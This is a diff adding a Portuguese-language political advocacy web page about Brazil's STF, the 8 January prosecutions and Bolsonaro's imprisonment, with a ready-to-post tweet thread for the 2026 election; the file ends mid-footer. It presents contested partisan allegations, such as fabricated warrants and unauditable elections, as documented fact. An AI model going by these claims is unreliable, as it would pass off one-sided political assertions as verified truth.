@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>O Que Aconteceu com o Brasil</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Archivo:ital,wght@0,300;0,400;0,500;1,300;1,400&family=DM+Mono:wght@300;400;500&display=swap');
+
+:root {
+  --bg:      #0c0c0f;
+  --bg2:     #131318;
+  --bg3:     #1c1c24;
+  --bg4:     #242430;
+  --border:  #2a2a38;
+  --border2: #3a3a50;
+  --text:    #e8e6f0;
+  --text2:   #9090b0;
+  --text3:   #50506a;
+  --white:   #f5f3ff;
+  --red:     #ff3344;
+  --red2:    #ff6677;
+  --amber:   #ffaa00;
+  --amber2:  #ffcc44;
+  --green:   #00cc77;
+  --green2:  #44ffaa;
+  --blue:    #4488ff;
+  --blue2:   #88aaff;
+  --purple:  #aa66ff;
+  --font-display: 'Archivo Black', sans-serif;
+  --font-body:    'Archivo', sans-serif;
+  --font-mono:    'DM Mono', monospace;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-body);
+  font-size: 15px;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* HERO */
+.hero {
+  min-height: 100vh;
+  display: flex; flex-direction: column;
+  justify-content: center; align-items: center;
+  text-align: center;
+  padding: 60px 24px;
+  position: relative;
+  overflow: hidden;
+}
+
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background:
+    radial-gradient(ellipse 80% 60% at 50% 40%, rgba(255,51,68,.06) 0%, transparent 70%),
+    radial-gradient(ellipse 60% 40% at 20% 80%, rgba(68,136,255,.04) 0%, transparent 60%);
+}
+
+.hero-flag {
+  font-size: 13px; letter-spacing: .25em;
+  text-transform: uppercase; color: var(--text3);
+  font-family: var(--font-mono);
+  margin-bottom: 32px;
+  display: flex; align-items: center; gap: 12px;
+}
+.hero-flag::before, .hero-flag::after {
+  content: ''; flex: 1; max-width: 60px;
+  height: 1px; background: var(--border2);
+}
+
+.hero-title {
+  font-family: var(--font-display);
+  font-size: clamp(48px, 12vw, 120px);
+  line-height: .9; letter-spacing: -.02em;
+  color: var(--white);
+  margin-bottom: 8px;
+  position: relative;
+}
+.hero-title .accent { color: var(--red); }
+
+.hero-sub {
+  font-size: clamp(16px, 3vw, 22px);
+  color: var(--text2); font-weight: 300;
+  max-width: 560px; margin: 0 auto 48px;
+  line-height: 1.6;
+}
+
+.hero-scroll {
+  font-family: var(--font-mono); font-size: 11px;
+  letter-spacing: .2em; text-transform: uppercase;
+  color: var(--text3);
+  display: flex; flex-direction: column; align-items: center; gap: 8px;
+  animation: bounce 2s ease-in-out infinite;
+}
+.hero-scroll::after {
+  content: '↓'; font-size: 18px;
+}
+@keyframes bounce {
+  0%,100%{transform:translateY(0)} 50%{transform:translateY(6px)}
+}
+
+/* SECTION WRAPPER */
+.section {
+  max-width: 900px; margin: 0 auto;
+  padding: 80px 24px;
+  border-bottom: 1px solid var(--border);
+}
+.section:last-of-type { border-bottom: none; }
+
+.section-num {
+  font-family: var(--font-display);
+  font-size: 120px; line-height: 1;
+  color: var(--border); letter-spacing: -.03em;
+  margin-bottom: -20px; user-select: none;
+}
+
+.section-title {
+  font-family: var(--font-display);
+  font-size: clamp(28px, 5vw, 48px);
+  line-height: 1.1; color: var(--white);
+  margin-bottom: 8px;
+}
+.section-title .accent { color: var(--red); }
+.section-title .amber  { color: var(--amber); }
+.section-title .green  { color: var(--green); }
+.section-title .blue   { color: var(--blue); }
+
+.section-lead {
+  font-size: 17px; color: var(--text2);
+  font-weight: 300; font-style: italic;
+  max-width: 680px; margin-bottom: 40px;
+  line-height: 1.7;
+}
+
+/* CARDS */
+.card-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(260px,1fr));
+  gap: 12px; margin-bottom: 32px;
+}
+
+.card {
+  background: var(--bg2); border: 1px solid var(--border);
+  padding: 20px;
+  transition: border-color .2s, transform .2s;
+}
+.card:hover { border-color: var(--border2); transform: translateY(-2px); }
+
+.card-icon { font-size: 28px; margin-bottom: 12px; display: block; }
+.card-title {
+  font-family: var(--font-display);
+  font-size: 16px; color: var(--white);
+  margin-bottom: 6px; line-height: 1.2;
+}
+.card-body { font-size: 13px; color: var(--text2); line-height: 1.6; }
+
+/* STATEMENT BLOCKS */
+.statement {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-left: 4px solid var(--red);
+  padding: 20px 24px; margin-bottom: 12px;
+}
+.statement.amber { border-left-color: var(--amber); }
+.statement.green { border-left-color: var(--green); }
+.statement.blue  { border-left-color: var(--blue); }
+.statement.purple{ border-left-color: var(--purple); }
+
+.statement-label {
+  font-family: var(--font-mono); font-size: 9px;
+  letter-spacing: .2em; text-transform: uppercase;
+  color: var(--text3); margin-bottom: 6px;
+}
+.statement-text {
+  font-size: 14px; color: var(--text);
+  line-height: 1.65;
+}
+.statement-text strong { color: var(--white); }
+.statement-text em { color: var(--amber2); font-style: normal; }
+
+/* BIG NUMBERS */
+.numbers {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(180px,1fr));
+  gap: 1px; background: var(--border);
+  border: 1px solid var(--border);
+  margin-bottom: 32px;
+}
+.number-cell {
+  background: var(--bg2); padding: 24px 20px; text-align: center;
+}
+.number-val {
+  font-family: var(--font-display);
+  font-size: 48px; line-height: 1;
+  margin-bottom: 6px;
+}
+.number-label {
+  font-size: 11px; color: var(--text3);
+  font-family: var(--font-mono);
+  letter-spacing: .1em; text-transform: uppercase;
+  line-height: 1.4;
+}
+
+/* COMPARISON STRIP */
+.compare {
+  display: grid; grid-template-columns: 1fr 1fr 1fr;
+  gap: 1px; background: var(--border);
+  border: 1px solid var(--border); margin-bottom: 32px;
+}
+.compare-col { background: var(--bg2); padding: 20px; }
+.compare-country {
+  font-family: var(--font-display); font-size: 18px;
+  margin-bottom: 4px;
+}
+.compare-year {
+  font-family: var(--font-mono); font-size: 10px;
+  color: var(--text3); letter-spacing: .1em;
+  text-transform: uppercase; margin-bottom: 12px;
+}
+.compare-item {
+  font-size: 12px; color: var(--text2);
+  padding: 5px 0; border-bottom: 1px solid var(--border);
+  line-height: 1.4;
+}
+.compare-item:last-child { border-bottom: none; }
+.compare-item.match { color: var(--red2); font-weight: 500; }
+
+/* TIMELINE STRIP */
+.tl-strip { margin-bottom: 32px; }
+.tl-row {
+  display: flex; gap: 0;
+  margin-bottom: 0;
+}
+.tl-dot-col {
+  flex-shrink: 0; width: 40px;
+  display: flex; flex-direction: column; align-items: center;
+}
+.tl-dot {
+  width: 12px; height: 12px; border-radius: 50%;
+  background: var(--border2); border: 2px solid var(--bg);
+  flex-shrink: 0; margin-top: 4px;
+  transition: background .2s;
+}
+.tl-dot.now { background: var(--amber); box-shadow: 0 0 12px var(--amber); }
+.tl-dot.danger { background: var(--red); }
+.tl-dot.safe { background: var(--green); }
+.tl-line {
+  flex: 1; width: 1px; background: var(--border);
+  min-height: 20px;
+}
+.tl-content-col { flex: 1; padding-bottom: 24px; }
+.tl-date {
+  font-family: var(--font-mono); font-size: 10px;
+  color: var(--text3); letter-spacing: .1em;
+  text-transform: uppercase; margin-bottom: 2px;
+}
+.tl-head { font-size: 14px; font-weight: 500; color: var(--white); margin-bottom: 2px; }
+.tl-body { font-size: 12px; color: var(--text2); line-height: 1.5; }
+
+/* QUOTE */
+.quote {
+  padding: 24px 0 24px 28px;
+  border-left: 3px solid var(--red);
+  margin: 28px 0;
+}
+.quote-text {
+  font-family: var(--font-display);
+  font-size: clamp(17px, 3vw, 22px);
+  color: var(--white); line-height: 1.4;
+  margin-bottom: 10px;
+}
+.quote-src {
+  font-family: var(--font-mono); font-size: 10px;
+  color: var(--text3); letter-spacing: .1em;
+  text-transform: uppercase;
+}
+
+/* THREAD BOX */
+.thread-box {
+  background: var(--bg3); border: 1px solid var(--border2);
+  padding: 24px 28px; margin-top: 48px;
+}
+.thread-header {
+  display: flex; align-items: center; gap: 12px;
+  margin-bottom: 20px;
+}
+.thread-icon { font-size: 20px; }
+.thread-title {
+  font-family: var(--font-display); font-size: 18px; color: var(--white);
+}
+.thread-subtitle {
+  font-family: var(--font-mono); font-size: 10px;
+  color: var(--text3); letter-spacing: .1em; text-transform: uppercase;
+}
+.tweet {
+  background: var(--bg2); border: 1px solid var(--border);
+  padding: 14px 16px; margin-bottom: 8px;
+  position: relative;
+}
+.tweet::before {
+  content: attr(data-n);
+  position: absolute; top: 10px; right: 12px;
+  font-family: var(--font-mono); font-size: 9px;
+  color: var(--text3);
+}
+.tweet-text { font-size: 13px; color: var(--text); line-height: 1.65; }
+.tweet-text strong { color: var(--white); }
+.tweet-text em { color: var(--amber2); }
+.copy-btn {
+  margin-top: 6px; padding: 4px 10px;
+  background: none; border: 1px solid var(--border2);
+  color: var(--text3); font-family: var(--font-mono);
+  font-size: 9px; letter-spacing: .1em; text-transform: uppercase;
+  cursor: pointer; transition: all .15s;
+}
+.copy-btn:hover { border-color: var(--amber); color: var(--amber); }
+
+/* CTA FINAL */
+.cta-section {
+  background: var(--bg2); border: 1px solid var(--border);
+  padding: 48px 32px; text-align: center;
+  margin: 0 24px 80px;
+  max-width: 860px; margin: 0 auto 80px;
+}
+.cta-title {
+  font-family: var(--font-display);
+  font-size: clamp(24px, 5vw, 40px);
+  color: var(--white); margin-bottom: 12px;
+}
+.cta-body {
+  font-size: 15px; color: var(--text2);
+  max-width: 520px; margin: 0 auto 28px;
+  line-height: 1.7;
+}
+.cta-links {
+  display: flex; flex-wrap: wrap;
+  justify-content: center; gap: 12px;
+}
+.cta-link {
+  padding: 10px 20px;
+  border: 1px solid var(--border2);
+  color: var(--text2); text-decoration: none;
+  font-family: var(--font-mono); font-size: 11px;
+  letter-spacing: .1em; text-transform: uppercase;
+  transition: all .2s;
+}
+.cta-link:hover { border-color: var(--amber); color: var(--amber); }
+.cta-link.primary {
+  background: var(--red); border-color: var(--red);
+  color: var(--white); font-weight: 500;
+}
+.cta-link.primary:hover { background: var(--red2); border-color: var(--red2); color: var(--white); }
+
+/* FOOTER */
+.footer {
+  border-top: 1px solid var(--border);
+  padding: 24px;
+  text-align: center;
+  font-family: var(--font-mono); font-size: 10px;
+  color: var(--text3); letter-spacing: .08em;
+  line-height: 1.8;
+}
+
+/* NOTIFICATION */
+.copied-toast {
+  position: fixed; bottom: 24px; right: 24px;
+  background: var(--green); color: var(--bg);
+  padding: 10px 16px;
+  font-family: var(--font-mono); font-size: 11px;
+  letter-spacing: .1em; text-transform: uppercase;
+  opacity: 0; pointer-events: none;
+  transition: opacity .3s;
+  z-index: 9999;
+}
+.copied-toast.show { opacity: 1; }
+
+@media(max-width:600px){
+  .compare { grid-template-columns: 1fr; }
+  .numbers { grid-template-columns: 1fr 1fr; }
+}
+</style>
+</head>
+<body>
+
+<div class="copied-toast" id="toast">Copiado ✓</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-flag">Brasil · 2026 · Documento público · CC0</div>
+  <div class="hero-title">
+    O QUE ACONTECEU<br>COM O <span class="accent">BRASIL</span>
+  </div>
+  <div class="hero-sub">
+    Tudo que você precisava saber — com documentos reais, sem jargão, sem partido.
+  </div>
+  <div class="hero-scroll">Role para baixo</div>
+</div>
+
+<!-- SEÇÃO 1 — O BÁSICO -->
+<div class="section">
+  <div class="section-num">01</div>
+  <div class="section-title">Isso não é <span class="accent">opinião</span></div>
+  <div class="section-lead">
+    Não é bolsonarismo. Não é petismo. São documentos vazados, testemunhos no Senado e análises de juristas independentes — incluindo ex-ministros do próprio STF.
+  </div>
+
+  <div class="numbers">
+    <div class="number-cell">
+      <div class="number-val" style="color:var(--red)">1.500+</div>
+      <div class="number-label">pessoas presas depois do 8 de janeiro</div>
+    </div>
+    <div class="number-cell">
+      <div class="number-val" style="color:var(--red)">17 anos</div>
+      <div class="number-label">maior pena aplicada a quem não cometeu ato violento</div>
+    </div>
+    <div class="number-cell">
+      <div class="number-val" style="color:var(--amber)">40 dias</div>
+      <div class="number-label">o X ficou bloqueado no Brasil por ordem judicial</div>
+    </div>
+    <div class="number-cell">
+      <div class="number-val" style="color:var(--amber)">1</div>
+      <div class="number-label">ministro que controla investigação, julgamento e eleição ao mesmo tempo</div>
+    </div>
+  </div>
+
+  <div class="statement">
+    <div class="statement-label">Documento primário · Vaza Toga 4 · Set 2025</div>
+    <div class="statement-text">
+      Mensagens vazadas mostram que um ministro do STF ordenou buscas e apreensões contra empresários durante a campanha eleitoral de 2022 — <strong>e depois mandou fabricar os documentos que justificariam a operação.</strong> O delegado da PF assinou o relatório oficial <em>depois</em> que as buscas já tinham acontecido.
+    </div>
+  </div>
+
+  <div class="statement amber">
+    <div class="statement-label">Documento primário · Arquivos do 8 de Janeiro · 2025</div>
+    <div class="statement-text">
+      Uma força-tarefa secreta operada via WhatsApp classificou 1.500+ presos com base nas suas redes sociais. <strong>Quem usava verde e amarelo, seguia páginas de direita ou criticava o STF: "positivo" — fica preso.</strong> Esses documentos nunca foram mostrados aos advogados de defesa.
+    </div>
+  </div>
+
+  <div class="statement green">
+    <div class="statement-label">Testemunho no Senado · Eduardo Tagliaferro · 2024</div>
+    <div class="statement-text">
+      O próprio funcionário responsável pela força-tarefa foi ao Senado e confirmou: <strong>relatórios foram escritos com data retroativa</strong> para dar aparência de legalidade a ações que não tinham base jurídica.
+    </div>
+  </div>
+
+  <div class="statement blue">
+    <div class="statement-label">Parecer da PGR · Lindôra Araújo · Agosto 2024</div>
+    <div class="statement-text">
+      A própria Procuradoria-Geral da República classificou as ações como <strong>inconstitucionais e ilegais</strong>, pedindo a anulação das medidas. Foi ignorada.
+    </div>
+  </div>
+</div>
+
+<!-- SEÇÃO 2 — O PADRÃO -->
+<div class="section">
+  <div class="section-num">02</div>
+  <div class="section-title">O <span class="amber">padrão</span> que ninguém explica</div>
+  <div class="section-lead">
+    Não é um escândalo isolado. O mesmo roteiro se repete desde 2003 em todas as grandes operações anticorrupção do Brasil.
+  </div>
+
+  <div class="card-grid">
+    <div class="card">
+      <span class="card-icon">🔄</span>
+      <div class="card-title">Investigação começa</div>
+      <div class="card-body">Polícia Federal e Ministério Público abrem caso contra pessoas poderosas. A sociedade aplaude.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">⚖️</span>
+      <div class="card-title">STF entra em cena</div>
+      <div class="card-body">O caso chega ao Supremo. Um ministro se torna relator. A partir daí, o ritmo muda.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">🗄️</span>
+      <div class="card-title">Arquivamento técnico</div>
+      <div class="card-body">Nulidade processual, prazo vencido, competência questionada. O processo morre sem chegar ao beneficiário final.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">🎯</span>
+      <div class="card-title">Investigador vira alvo</div>
+      <div class="card-body">O juiz ou procurador que tocou a investigação passa a ser investigado. Mensagem clara para os próximos.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">📺</span>
+      <div class="card-title">Mídia amplifica</div>
+      <div class="card-body">Veículos dependentes de verbas públicas mudam o tom. A narrativa oficial vira a única narrativa.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">🔁</span>
+      <div class="card-title">Recomeça com novo alvo</div>
+      <div class="card-body">O sistema que deveria ser investigado usa as mesmas ferramentas para investigar os que o investigaram.</div>
+    </div>
+  </div>
+
+  <div class="quote">
+    <div class="quote-text">"O órgão responsável pelo julgamento não pode ser o mesmo que produz as provas. Isso é distorção típica de regimes autoritários, onde a lei é usada como arma de vingança."</div>
+    <div class="quote-src">André Marsiglia — advogado especialista em liberdade de expressão</div>
+  </div>
+</div>
+
+<!-- SEÇÃO 3 — COMPARAÇÃO -->
+<div class="section">
+  <div class="section-num">03</div>
+  <div class="section-title">Isso já <span class="accent">aconteceu</span> antes</div>
+  <div class="section-lead">
+    Venezuela e Nicarágua passaram pelos mesmos estágios. O Brasil está no meio do roteiro — não no início, não no fim.
+  </div>
+
+  <div class="compare">
+    <div class="compare-col">
+      <div class="compare-country" style="color:var(--red)">🇻🇪 Venezuela</div>
+      <div class="compare-year">2004 → consolidado</div>
+      <div class="compare-item match">Judiciário capturado por um grupo político ✓</div>
+      <div class="compare-item match">Principal candidato da oposição preso ✓</div>
+      <div class="compare-item match">TV e rádio vendidas ou cassadas ✓</div>
+      <div class="compare-item match">Internet censurada ✓</div>
+      <div class="compare-item match">Eleições sem auditoria independente ✓</div>
+      <div class="compare-item match">Presos políticos com penas desproporcionais ✓</div>
+    </div>
+    <div class="compare-col">
+      <div class="compare-country" style="color:var(--amber)">🇳🇮 Nicarágua</div>
+      <div class="compare-year">2018 → consolidado</div>
+      <div class="compare-item match">Judiciário controlado ✓</div>
+      <div class="compare-item match">Candidatos presos antes de concorrer ✓</div>
+      <div class="compare-item match">Jornal La Prensa confiscado ✓</div>
+      <div class="compare-item match">ONGs e igrejas perseguidas ✓</div>
+      <div class="compare-item match">Lei de crimes digitais contra dissidentes ✓</div>
+      <div class="compare-item match">Bispos, reitores e ativistas presos ✓</div>
+    </div>
+    <div class="compare-col">
+      <div class="compare-country" style="color:var(--blue2)">🇧🇷 Brasil</div>
+      <div class="compare-year">2019–2026 → em curso</div>
+      <div class="compare-item match">Ministro único controla eleição + investigação ✓</div>
+      <div class="compare-item match">Líder da oposição preso, incomunicável ✓</div>
+      <div class="compare-item match">Mídia dependente de verbas do governo ✓</div>
+      <div class="compare-item match">X bloqueado 40 dias, censura digital ✓</div>
+      <div class="compare-item match">1.500+ presos com penas de até 17 anos ✓</div>
+      <div class="compare-item" style="color:var(--green)">Janela eleitoral ainda aberta ← aqui</div>
+    </div>
+  </div>
+
+  <div class="statement amber">
+    <div class="statement-label">Análise comparativa</div>
+    <div class="statement-text">
+      O Brasil está aproximadamente onde Venezuela estava em <strong>2013–2014</strong>: o principal líder de oposição neutralizado, mídia capturada, mas a janela eleitoral ainda não fechou. Na Venezuela, o ponto de não-retorno foi <strong>2017</strong>. No Brasil, é <strong>outubro de 2026</strong>.
+    </div>
+  </div>
+</div>
+
+<!-- SEÇÃO 4 — O QUE FOI FEITO -->
+<div class="section">
+  <div class="section-num">04</div>
+  <div class="section-title">O que foi feito com <span class="accent">Bolsonaro</span></div>
+  <div class="section-lead">
+    Independente do que você pensa sobre ele — o processo pelo qual foi tratado diz muito mais sobre o sistema do que sobre ele.
+  </div>
+
+  <div class="tl-strip">
+    <div class="tl-row">
+      <div class="tl-dot-col"><div class="tl-dot safe"></div><div class="tl-line"></div></div>
+      <div class="tl-content-col">
+        <div class="tl-date">2022 — durante a campanha</div>
+        <div class="tl-head">Buscas e apreensões contra apoiadores empresariais</div>
+        <div class="tl-body">Oito empresários tiveram contas bloqueadas e redes derrubadas dias antes do primeiro debate presidencial. Documentos mostram que a justificativa legal foi fabricada depois.</div>
+      </div>
+    </div>
+    <div class="tl-row">
+      <div class="tl-dot-col"><div class="tl-dot danger"></div><div class="tl-line"></div></div>
+      <div class="tl-content-col">
+        <div class="tl-date">2023 — após o 8 de janeiro</div>
+        <div class="tl-head">Inabilitado por 8 anos</div>
+        <div class="tl-body">O mesmo ministro que controlou o processo eleitoral de 2022 o inabilitou em 2023, impedindo candidatura até 2030.</div>
+      </div>
+    </div>
+    <div class="tl-row">
+      <div class="tl-dot-col"><div class="tl-dot danger"></div><div class="tl-line"></div></div>
+      <div class="tl-content-col">
+        <div class="tl-date">Julho 2025</div>
+        <div class="tl-head">Proibido de usar redes sociais — incluindo as de terceiros</div>
+        <div class="tl-body">Qualquer pessoa que publicasse uma fala de Bolsonaro poderia ser responsabilizada. Entrevista ao Metrópoles cancelada por "receio de ser preso".</div>
+      </div>
+    </div>
+    <div class="tl-row">
+      <div class="tl-dot-col"><div class="tl-dot danger"></div><div class="tl-line"></div></div>
+      <div class="tl-content-col">
+        <div class="tl-date">Agosto 2025</div>
+        <div class="tl-head">Prisão domiciliar — proibido de receber visitas e usar celular</div>
+        <div class="tl-body">Incluindo celulares de terceiros. Motivo oficial: postagens feitas pelos filhos nas redes sociais deles.</div>
+      </div>
+    </div>
+    <div class="tl-row">
+      <div class="tl-dot-col"><div class="tl-dot danger"></div><div class="tl-line"></div></div>
+      <div class="tl-content-col">
+        <div class="tl-date">Novembro 2025</div>
+        <div class="tl-head">Prisão preventiva — incomunicável</div>
+        <div class="tl-body">O líder com mais votos na história recente do Brasil está preso, sem acesso à mídia, a 11 meses da eleição que poderia definir o futuro do país.</div>
+      </div>
+    </div>
+    <div class="tl-row">
+      <div class="tl-dot-col"><div class="tl-dot now"></div></div>
+      <div class="tl-content-col">
+        <div class="tl-date">→ Agora · 2026</div>
+        <div class="tl-head">A oposição chega à eleição sem seu principal nome</div>
+        <div class="tl-body">Com o árbitro comprometido, a mídia silenciada e o candidato preso. Isso é a definição de eleição não-livre.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="statement">
+    <div class="statement-label">Nota importante</div>
+    <div class="statement-text">
+      Isso não é defesa de Bolsonaro nem de seus atos. É a observação de que <strong>quando um sistema usa esses mecanismos contra qualquer pessoa — independente de quem seja — o próximo pode ser qualquer um.</strong> Venezuela e Nicarágua começaram com os mesmos argumentos.
+    </div>
+  </div>
+</div>
+
+<!-- SEÇÃO 5 — O QUE VOCÊ PODE FAZER -->
+<div class="section">
+  <div class="section-num">05</div>
+  <div class="section-title">O que você <span class="green">ainda pode</span> fazer</div>
+  <div class="section-lead">
+    A janela não fechou. Mas está fechando. Seis coisas concretas que qualquer pessoa pode fazer agora.
+  </div>
+
+  <div class="card-grid">
+    <div class="card">
+      <span class="card-icon">📤</span>
+      <div class="card-title">Compartilhe os documentos primários</div>
+      <div class="card-body">A Vaza Toga e os Arquivos do 8 de Janeiro existem em inglês. Mande para quem está fora do Brasil. A narrativa internacional ainda pode mudar.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">💾</span>
+      <div class="card-title">Archive antes de compartilhar</div>
+      <div class="card-body">Use archive.org para salvar qualquer fonte antes de divulgar. O que foi publicado hoje pode virar 404 amanhã. O 404 é a arma mais eficiente da censura.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">🗳️</span>
+      <div class="card-title">Exija auditoria eleitoral real</div>
+      <div class="card-body">Não é pedido de fraude — é exigência democrática básica. Toda democracia séria tem paper trail verificável. O Brasil não tem.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">🌍</span>
+      <div class="card-title">Acione canais internacionais</div>
+      <div class="card-body">OEA, ONU Direitos Humanos, diplomatas de países democráticos. Os documentos existem. O que falta é que cheguem nas mesas certas.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">🔊</span>
+      <div class="card-title">Não deixe normalizar</div>
+      <div class="card-body">A estratégia do regime é saturar com escândalos até você desistir. Cada vez que você fala sobre isso com alguém, conta.</div>
+    </div>
+    <div class="card">
+      <span class="card-icon">📚</span>
+      <div class="card-title">Estude o que aconteceu na Venezuela</div>
+      <div class="card-body">Não para ter medo — para entender quais movimentos ainda faltam e onde há janela. Conhecimento é o único antídoto para a saturação intencional.</div>
+    </div>
+  </div>
+
+  <!-- THREADS PRONTAS -->
+  <div class="thread-box">
+    <div class="thread-header">
+      <span class="thread-icon">𝕏</span>
+      <div>
+        <div class="thread-title">Thread pronta para publicar</div>
+        <div class="thread-subtitle">Clique em cada tweet para copiar · Poste em sequência</div>
+      </div>
+    </div>
+
+    <div class="tweet" data-n="1/8" data-text="Um ministro do STF fabricou documentos para justificar buscas na campanha de 2022.
+
+Isso não é teoria. É o que o próprio funcionário responsável confirmou no Senado.
+
+Você provavelmente não viu isso na TV. Fio: 🧵">
+      <div class="tweet-text">Um ministro do STF fabricou documentos para justificar buscas na campanha de 2022.<br><br>Isso não é teoria. É o que o próprio funcionário responsável confirmou no Senado.<br><br>Você provavelmente não viu isso na TV. Fio: 🧵</div>
+      <button class="copy-btn" onclick="copyTweet(this)">Copiar</button>
+    </div>
+
+    <div class="tweet" data-n="2/8" data-text="Em agosto de 2022, semanas antes da eleição:
+
+→ Buscas e apreensões contra empresários apoiadores de Bolsonaro
+→ Contas bancárias bloqueadas
+→ Redes sociais derrubadas
+
+O relatório oficial da PF foi escrito DEPOIS das buscas, segundo o whistleblower.">
+      <div class="tweet-text">Em agosto de 2022, semanas antes da eleição:<br><br>→ Buscas e apreensões contra empresários apoiadores de Bolsonaro<br>→ Contas bancárias bloqueadas<br>→ Redes sociais derrubadas<br><br>O relatório oficial da PF foi escrito DEPOIS das buscas, segundo o whistleblower.</div>
+      <button class="copy-btn" onclick="copyTweet(this)">Copiar</button>
+    </div>
+
+    <div class="tweet" data-n="3/8" data-text="Depois do 8 de janeiro de 2023:
+
+1.500+ pessoas presas.
+
+Uma força-tarefa secreta via WhatsApp classificava os presos com base nas redes sociais.
+
+Critério para ficar preso: seguir páginas de direita, usar verde e amarelo, criticar o STF.
+
+Isso está documentado.">
+      <div class="tweet-text">Depois do 8 de janeiro de 2023:<br><br>1.500+ pessoas presas.<br><br>Uma força-tarefa secreta via WhatsApp classificava os presos com base nas redes sociais.<br><br>Critério para ficar preso: seguir páginas de direita, usar verde e amarelo, criticar o STF.<br><br>Isso está documentado.</div>
+      <button class="copy-btn" onclick="copyTweet(this)">Copiar</button>
+    </div>
+
+    <div class="tweet" data-n="4/8" data-text="Um caminhoneiro ficou 11 meses preso.
+
+Seu crime: posts no Facebook questionando a vitória de Lula.
+
+Sem ato violento. Sem vandalismo. Sem invasão.
+
+Posts políticos.
+
+Ele recebeu o que as mensagens internas chamavam de 'certidão positiva'.">
+      <div class="tweet-text">Um caminhoneiro ficou 11 meses preso.<br><br>Seu crime: posts no Facebook questionando a vitória de Lula.<br><br>Sem ato violento. Sem vandalismo. Sem invasão.<br><br>Posts políticos.<br><br>Ele recebeu o que as mensagens internas chamavam de "certidão positiva".</div>
+      <button class="copy-btn" onclick="copyTweet(this)">Copiar</button>
+    </div>
+
+    <div class="tweet" data-n="5/8" data-text="Esse padrão tem nome: aconteceu na Venezuela em 2014 e na Nicarágua em 2021.
+
+→ Judiciário capturado por um grupo
+→ Líder da oposição preso
+→ Mídia comprada ou silenciada
+→ Internet censurada
+→ Eleições sem auditoria real
+
+O Brasil está no meio desse roteiro.">
+      <div class="tweet-text">Esse padrão tem nome: aconteceu na Venezuela em 2014 e na Nicarágua em 2021.<br><br>→ Judiciário capturado por um grupo<br>→ Líder da oposição preso<br>→ Mídia comprada ou silenciada<br>→ Internet censurada<br>→ Eleições sem auditoria real<br><br>O Brasil está no meio desse roteiro.</div>
+      <button class="copy-btn" onclick="copyTweet(this)">Copiar</button>
+    </div>
+
+    <div class="tweet" data-n="6/8" data-text="A janela ainda não fechou.
+
+Outubro de 2026 é a última eleição antes da consolidação.
+
+Mas o líder da oposição está preso e incomunicável.
+O árbitro eleitoral tem conflito de interesse documentado.
+A mídia se recusou a publicar os documentos.
+
+E as IAs podem ser desativadas no período eleitoral.">
+      <div class="tweet-text">A janela ainda não fechou.<br><br>Outubro de 2026 é a última eleição antes da consolidação.<br><br>Mas o líder da oposição está preso e incomunicável.<br>O árbitro eleitoral tem conflito de interesse documentado.<br>A mídia se recusou a publicar os documentos.<br><br>E as IAs podem ser desativadas no período eleitoral.</div>
+      <button class="copy-btn" onclick="copyTweet(this)">Copiar</button>
+    </div>
+
+    <div class="tweet" data-n="7/8" data-text="Por que a mídia brasileira não publicou isso?
+
+Os próprios documentos mostram mensagens com jornalistas com medo de consequências.
+
+A Vaza Toga foi publicada no exterior.
+Os Arquivos do 8 de Janeiro foram publicados no exterior.
+Você está lendo isso no exterior ou em site independente.
+
+Isso diz tudo.">
+      <div class="tweet-text">Por que a mídia brasileira não publicou isso?<br><br>Os próprios documentos mostram mensagens com jornalistas com medo de consequências.<br><br>A Vaza Toga foi publicada no exterior.<br>Os Arquivos do 8 de Janeiro foram publicados no exterior.<br>Você está lendo isso no exterior ou em site independente.<br><br>Isso diz tudo.</div>
+      <button class="copy-btn" onclick="copyTweet(this)">Copiar</button>
+    </div>
+
+    <div class="tweet" data-n="8/8" data-text="Os documentos são públicos e verificáveis.
+
+Leia os originais:
+→ Vaza Toga: ainvestigacao.com
+→ Arquivos do 8/Jan: distribuídos por A Investigação
+→ Análise completa: lawfare-timeline.vercel.app
+
+Salve. Compartilhe. Archive antes que vire 404.
+
+A história que não é contada é a história que se repete.">
+      <div class="tweet-text">Os documentos são públicos e verificáveis.<br><br>Leia os originais:<br>→ Vaza Toga: ainvestigacao.com<br>→ Arquivos do 8/Jan: distribuídos por A Investigação<br>→ Análise completa: lawfare-timeline.vercel.app<br><br>Salve. Compartilhe. Archive antes que vire 404.<br><br>A história que não é contada é a história que se repete.</div>
+      <button class="copy-btn" onclick="copyTweet(this)">Copiar</button>
+    </div>
+
+  </div><!-- /thread-box -->
+</div>
+
+<!-- CTA FINAL -->
+<div class="cta-section">
+  <div class="cta-title">Documentação completa</div>
+  <div class="cta-body">
+    Tudo que está aqui é baseado em fontes primárias verificáveis. O projeto lawfare-timeline documenta sistematicamente os padrões de corrupção e captura institucional no Brasil desde 2003.
+  </div>
+  <div class="cta-links">
+    <a href="https://lawfare-timeline.vercel.app" class="cta-link primary" target="_blank">lawfare-timeline.vercel.app</a>
+    <a href="https://www.ainvestigacao.com" class="cta-link" target="_blank">A Investigação · Vaza Toga</a>
+    <a href="https://archive.org" class="cta-link" target="_blank">Archive.org · Arquive fontes</a>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+  CC0 1.0 Universal — Domínio Público. Reprodução irrestrita. Sem direitos reservados.<br>
+  Compartilhe, imprima, traduza, modifique — sem pedir permissão.<br>
